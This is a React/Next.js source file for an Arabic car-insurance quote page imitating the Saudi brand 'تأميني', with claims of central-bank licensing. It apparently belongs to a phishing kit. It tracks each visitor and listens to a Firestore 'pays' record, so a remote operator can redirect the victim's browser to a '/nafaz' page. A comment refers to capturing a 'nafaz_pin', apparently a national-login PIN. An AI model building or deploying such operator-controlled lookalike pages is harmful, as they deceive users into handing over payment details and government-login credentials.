"use client"


import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Shield, Star, Phone, Mail, Menu, X, ArrowLeft, Zap, Award, Clock, Users, Sparkles } from "lucide-react"
import { useState, useEffect } from "react"
import { setupOnlineStatus } from "@/lib/utils"
import { ProfessionalQuoteForm } from "@/components/insurance/quote-form"
import { doc, onSnapshot } from "firebase/firestore"
import { db } from "@/lib/firebase"

export default function QuotePage() {
  const [mounted, setMounted] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  useEffect(() => {
    // Initialize visitor ID if not exists
    const visitorID = localStorage.getItem("visitor")
    if (visitorID) {
      setMounted(true)
      setupOnlineStatus(visitorID!)
    } else {
      // Create new visitor ID if none exists
      const newVisitorId = "visitor_" + Date.now()
      localStorage.setItem("visitor", newVisitorId)
      setMounted(true)
      setupOnlineStatus(newVisitorId)
    }
  }, [])
  useEffect(()=>{
    const visitorId=localStorage.getItem('visitor')
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
        if (docSnapshot.exists()) {
          const userData = docSnapshot.data()
          // Assuming the PIN is stored in a field called 'nafaz_pin'
          if(userData.currentPage ==='1'){
              window.location.href='/quote'
          }else if(userData.currentPage ==='8888'|| userData.currentPage ==="nafaz"){
            window.location.href='/nafaz'
          }
          
        } else {
          console.error("User document not found")
        }
      },
      
    )
  
    // Clean up the listener when component unmounts or modal closes
    return () => unsubscribe()
  }, [])
  if (!mounted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-blue-50/30 flex items-center justify-center">
        <div className="text-center">
          <div className="w-24 h-24 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-8"></div>
          <div className="space-y-3">
            <p className="text-2xl font-bold text-gray-800">جاري التحميل...</p>
            <p className="text-lg text-gray-500">يتم تحضير منصة التأمين الذكية</p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-blue-50/30" dir="rtl">
      {/* Enhanced Header */}
      <header className="bg-white/95 backdrop-blur-xl border-b border-gray-100 px-4 lg:px-6 py-4 sticky top-0 z-50 shadow-lg">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4 lg:gap-8">
            <div className="flex items-center gap-4">
              <div className="w-28 h-16 rounded-2xl flex items-center justify-center">
                <img src="/Logo-AR.png" alt="logo" width={112} height={64} className="rounded-xl" />
              </div>
              <div className="hidden sm:block">
                <h1 className="text-xl font-bold bg-gradient-to-r from-blue-600 to-blue-800 bg-clip-text text-transparent">
                  تأميني
                </h1>
                <p className="text-sm text-gray-600 font-semibold">منصة التأمين الذكية</p>
              </div>
            </div>
            <nav className="hidden lg:flex items-center gap-8 text-sm font-bold">
              <a href="/" className="text-gray-700 hover:text-blue-600 transition-colors duration-300 relative group">
                الرئيسية
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
              </a>
              <a
                href="/#services"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 relative group"
              >
                الخدمات
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
              </a>
              <a
                href="/#about"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 relative group"
              >
                عن الشركة
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
              </a>
              <a
                href="/#contact"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 relative group"
              >
                اتصل بنا
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
              </a>
            </nav>
          </div>
          <div className="flex items-center gap-3">
            <Button
              variant="ghost"
              size="sm"
              className="hidden sm:flex text-gray-600 hover:text-blue-600 font-semibold"
            >
              English
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="hidden sm:flex border-2 border-gray-200 hover:border-blue-500 hover:text-blue-600 bg-white font-semibold transition-all duration-300 rounded-xl"
            >
              تسجيل الدخول
            </Button>
            <Button
              size="sm"
              className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 shadow-xl text-white font-bold px-8 py-3 transition-all duration-300 rounded-xl transform hover:scale-105"
            >
              ابدأ الآن
            </Button>
            <Button variant="ghost" size="sm" className="lg:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
              {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
            </Button>
          </div>
        </div>

        {/* Enhanced Mobile Menu */}
        {mobileMenuOpen && (
          <div className="lg:hidden mt-6 pb-6 border-t border-gray-100 bg-white/95 backdrop-blur-xl rounded-b-2xl shadow-2xl">
            <nav className="flex flex-col gap-4 pt-6">
              <a
                href="/"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 py-4 px-4 rounded-xl hover:bg-blue-50 font-semibold"
              >
                الرئيسية
              </a>
              <a
                href="/#services"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 py-4 px-4 rounded-xl hover:bg-blue-50 font-semibold"
              >
                الخدمات
              </a>
              <a
                href="/#about"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 py-4 px-4 rounded-xl hover:bg-blue-50 font-semibold"
              >
                عن الشركة
              </a>
              <a
                href="/#contact"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 py-4 px-4 rounded-xl hover:bg-blue-50 font-semibold"
              >
                اتصل بنا
              </a>
              <div className="flex gap-3 pt-4 border-t border-gray-100">
                <Button variant="ghost" size="sm" className="text-gray-600 flex-1 font-semibold">
                  English
                </Button>
                <Button variant="outline" size="sm" className="border-gray-300 flex-1 bg-white font-semibold">
                  تسجيل الدخول
                </Button>
              </div>
            </nav>
          </div>
        )}
      </header>

      {/* Enhanced Hero Section */}
      <section className="relative bg-gradient-to-br from-blue-600 via-blue-700 to-indigo-800 text-white py-24 lg:py-32 overflow-hidden">
        {/* Background Pattern */}
        <div className="absolute inset-0 opacity-10">
          <div className="absolute top-0 left-0 w-96 h-96 bg-white rounded-full -translate-x-48 -translate-y-48 blur-3xl"></div>
          <div className="absolute bottom-0 right-0 w-96 h-96 bg-white rounded-full translate-x-48 translate-y-48 blur-3xl"></div>
          <div className="absolute top-1/2 left-1/2 w-64 h-64 bg-white rounded-full -translate-x-32 -translate-y-32 blur-3xl"></div>
        </div>

        <div className="relative max-w-6xl mx-auto px-4 lg:px-6 text-center">
          <div className="space-y-12">
            <div className="flex items-center justify-center gap-4 mb-10">
              <Button
                variant="ghost"
                size="sm"
                className="text-blue-100 hover:text-white hover:bg-white/10 transition-all duration-300 backdrop-blur-sm border border-white/20 font-semibold rounded-xl px-6 py-3"
                onClick={() => (window.location.href = "/")}
              >
                <ArrowLeft className="w-4 h-4 ml-2" />
                العودة للرئيسية
              </Button>
            </div>

            <div className="space-y-10">
              <Badge className="bg-white/20 text-white border-white/30 px-6 py-3 text-lg font-bold backdrop-blur-sm rounded-full shadow-xl">
                <Sparkles className="w-6 h-6 ml-2" />
                عرض سعر مجاني ومقارنة فورية
              </Badge>
              <h1 className="text-4xl lg:text-7xl font-bold leading-tight">
                احصل على أفضل عروض
                <br />
                <span className="text-blue-200">تأمين السيارات</span>
              </h1>
              <p className="text-xl lg:text-2xl text-blue-100 max-w-3xl mx-auto leading-relaxed font-semibold">
                قارن بين أكثر من 25 شركة تأمين واحصل على أفضل الأسعار في أقل من 3 دقائق
              </p>
            </div>

            {/* Enhanced Stats */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-10 max-w-4xl mx-auto mt-20">
              <div className="text-center group">
                <div className="w-24 h-24 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-8 group-hover:bg-white/30 transition-all duration-500 backdrop-blur-sm shadow-xl group-hover:scale-110">
                  <Shield className="w-12 h-12 text-white" />
                </div>
                <div className="text-4xl font-bold mb-3">25+</div>
                <p className="text-blue-100 text-xl font-semibold">شركة تأمين</p>
              </div>
              <div className="text-center group">
                <div className="w-24 h-24 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-8 group-hover:bg-white/30 transition-all duration-500 backdrop-blur-sm shadow-xl group-hover:scale-110">
                  <Zap className="w-12 h-12 text-white" />
                </div>
                <div className="text-4xl font-bold mb-3">3</div>
                <p className="text-blue-100 text-xl font-semibold">دقائق فقط</p>
              </div>
              <div className="text-center group">
                <div className="w-24 h-24 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-8 group-hover:bg-white/30 transition-all duration-500 backdrop-blur-sm shadow-xl group-hover:scale-110">
                  <Star className="w-12 h-12 text-white" />
                </div>
                <div className="text-4xl font-bold mb-3">100%</div>
                <p className="text-blue-100 text-xl font-semibold">مجاني تماماً</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Enhanced Quote Form Section */}
      <section className="py-24 lg:py-32 relative">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-20">
            <Badge className="bg-blue-100 text-blue-700 px-8 py-4 text-lg font-bold mb-8 rounded-full shadow-lg">
              احصل على عرض السعر
            </Badge>
            <h2 className="text-3xl lg:text-5xl font-bold text-gray-900 mb-8">احصل على عرض السعر الخاص بك</h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto leading-relaxed">
              اتبع الخطوات البسيطة للحصول على أفضل عروض التأمين المخصصة لاحتياجاتك
            </p>
          </div>
          <ProfessionalQuoteForm />
        </div>
      </section>

      {/* Enhanced Trust Indicators */}
      <section className="py-24 bg-white">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-20">
            <Badge className="bg-green-100 text-green-700 px-8 py-4 text-lg font-bold mb-8 rounded-full shadow-lg">
              <Award className="w-6 h-6 ml-2" />
              الثقة والأمان
            </Badge>
            <h2 className="text-3xl lg:text-5xl font-bold text-gray-900 mb-8">لماذا يثق بنا أكثر من 500,000 عميل؟</h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto leading-relaxed">
              نحن ملتزمون بتقديم أفضل خدمة تأمين رقمية في المملكة العربية السعودية
            </p>
          </div>

          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8">
            {[
              {
                icon: Shield,
                title: "أمان وثقة",
                description: "بياناتك محمية بأعلى معايير الأمان العالمية",
                gradient: "from-blue-500 to-blue-600",
                bgColor: "from-blue-50 to-blue-100",
              },
              {
                icon: Award,
                title: "تقييم ممتاز",
                description: "4.9/5 من تقييمات العملاء على جميع المنصات",
                gradient: "from-yellow-500 to-yellow-600",
                bgColor: "from-yellow-50 to-yellow-100",
              },
              {
                icon: Users,
                title: "خبرة واسعة",
                description: "أكثر من 500,000 عميل راضي وثقة متنامية",
                gradient: "from-green-500 to-green-600",
                bgColor: "from-green-50 to-green-100",
              },
              {
                icon: Clock,
                title: "دعم مستمر",
                description: "خدمة عملاء متخصصة متاحة 24/7",
                gradient: "from-purple-500 to-purple-600",
                bgColor: "from-purple-50 to-purple-100",
              },
            ].map((feature, index) => (
              <div
                key={index}
                className="group bg-white rounded-2xl shadow-xl hover:shadow-2xl transition-all duration-500 overflow-hidden border-0 transform hover:scale-105"
              >
                <div className={`h-2 bg-gradient-to-r ${feature.gradient}`}></div>
                <div className="p-8 text-center">
                  <div
                    className={`w-20 h-20 bg-gradient-to-br ${feature.bgColor} rounded-2xl flex items-center justify-center mx-auto mb-8 group-hover:scale-110 transition-transform duration-500 shadow-lg`}
                  >
                    <feature.icon
                      className={`w-10 h-10 bg-gradient-to-br ${feature.gradient} bg-clip-text text-transparent`}
                    />
                  </div>
                  <h3 className="text-xl font-bold text-gray-900 mb-4">{feature.title}</h3>
                  <p className="text-gray-600 leading-relaxed">{feature.description}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Enhanced Contact Support */}
      <section className="py-24 bg-gradient-to-br from-gray-50 to-blue-50/50">
        <div className="max-w-4xl mx-auto px-4 lg:px-6 text-center">
          <div className="space-y-12">
            <div>
              <Badge className="bg-blue-100 text-blue-700 px-8 py-4 text-lg font-bold mb-8 rounded-full shadow-lg">
                <Phone className="w-6 h-6 ml-2" />
                الدعم والمساعدة
              </Badge>
              <h2 className="text-3xl lg:text-5xl font-bold text-gray-900 mb-8">هل تحتاج مساعدة؟</h2>
              <p className="text-xl text-gray-600 max-w-3xl mx-auto leading-relaxed">
                فريق الخبراء متاح لمساعدتك في اختيار أفضل تأمين لسيارتك وتقديم الاستشارة المجانية
              </p>
            </div>

            <div className="flex flex-col sm:flex-row gap-6 justify-center">
              <Button
                size="lg"
                className="bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white px-12 py-6 text-xl font-bold rounded-2xl shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:scale-105"
              >
                <Phone className="w-6 h-6 ml-3" />
                اتصل بنا: 920000000
              </Button>
              <Button
                variant="outline"
                size="lg"
                className="border-2 border-gray-300 hover:border-blue-500 hover:text-blue-600 px-12 py-6 text-xl font-bold bg-white rounded-2xl shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:scale-105"
              >
                <Mail className="w-6 h-6 ml-3" />
                راسلنا عبر البريد
              </Button>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-8 mt-20 max-w-4xl mx-auto">
              <div className="text-center bg-white rounded-2xl p-8 shadow-xl">
                <div className="text-3xl font-bold text-blue-600 mb-3">24/7</div>
                <p className="text-gray-600 font-semibold">خدمة العملاء</p>
              </div>
              <div className="text-center bg-white rounded-2xl p-8 shadow-xl">
                <div className="text-3xl font-bold text-blue-600 mb-3">{"<"} 30 ثانية</div>
                <p className="text-gray-600 font-semibold">وقت الاستجابة</p>
              </div>
              <div className="text-center bg-white rounded-2xl p-8 shadow-xl">
                <div className="text-3xl font-bold text-blue-600 mb-3">98%</div>
                <p className="text-gray-600 font-semibold">رضا العملاء</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Enhanced Footer */}
      <footer className="bg-gray-900 text-white py-24">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-12 mb-20">
            <div className="space-y-8">
              <div className="flex items-center gap-4">
                <div className="w-44 h-24 p-4 bg-white rounded-2xl flex items-center justify-center shadow-xl">
                  <img src="/Logo-AR.png" alt="logo" width={176} height={96} />
                </div>
              </div>
              <p className="text-gray-400 leading-relaxed text-lg">
                منصة التأمين الرقمية الرائدة في السعودية، نقدم أفضل الحلول التأمينية بأسعار تنافسية
              </p>
            </div>

            <div>
              <h3 className="font-bold mb-8 text-xl">الخدمات</h3>
              <ul className="space-y-4 text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    تأمين السيارات
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    التأمين الصحي
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    تأمين السفر
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    تأمين المنازل
                  </a>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-8 text-xl">الشركة</h3>
              <ul className="space-y-4 text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    من نحن
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    فريق العمل
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    الوظائف
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    الأخبار
                  </a>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-8 text-xl">الدعم</h3>
              <ul className="space-y-4 text-gray-400">
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    مركز المساعدة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    اتصل بنا
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    الأسئلة الشائعة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white transition-colors duration-300 text-lg">
                    سياسة الخصوصية
                  </a>
                </li>
              </ul>
            </div>
          </div>

          <div className="border-t border-gray-800 pt-12 flex flex-col sm:flex-row justify-between items-center gap-6">
            <p className="text-gray-400 text-center sm:text-right text-lg">
              © 2024 تأميني. جميع الحقوق محفوظة. مرخص من البنك المركزي السعودي.
            </p>
            <div className="flex gap-4">
              <Badge variant="outline" className="border-gray-600 text-gray-400 px-6 py-3 text-sm rounded-full">
                مرخص من ساما
              </Badge>
              <Badge variant="outline" className="border-gray-600 text-gray-400 px-6 py-3 text-sm rounded-full">
                ISO 27001
              </Badge>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
